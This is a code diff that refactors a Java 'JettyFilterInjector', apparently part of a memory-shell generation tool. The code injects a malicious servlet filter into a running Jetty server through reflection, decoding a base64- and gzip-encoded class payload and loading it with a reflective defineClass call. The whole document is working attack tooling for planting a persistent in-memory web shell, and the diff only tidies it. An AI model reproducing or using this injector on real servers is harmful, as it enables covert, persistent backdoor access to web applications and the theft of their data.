@@ -44,8 +44,7 @@ public class JettyFilterInjector {
         return "{{base64Str}}";
     }
 
-    public void inject(Object context, Object magicFilter) throws Exception {
-        Class<?> filterClass = magicFilter.getClass();
+    public void inject(Object context, Object filter) throws Exception {
         Object servletHandler = getFieldValue(context, "_servletHandler");
 
         if (servletHandler == null) {
@@ -65,7 +64,7 @@ public class JettyFilterInjector {
             filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
         }
         Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
-        Object filterHolder = constructor.newInstance(filterClass);
+        Object filterHolder = constructor.newInstance(filter.getClass());
         invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
 
         // 2. 注入内存马Filter
@@ -183,21 +182,19 @@ public class JettyFilterInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     public boolean isInjected(Object servletHandler) throws Exception {
@@ -238,7 +235,6 @@ public class JettyFilterInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -246,16 +242,13 @@ public class JettyFilterInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
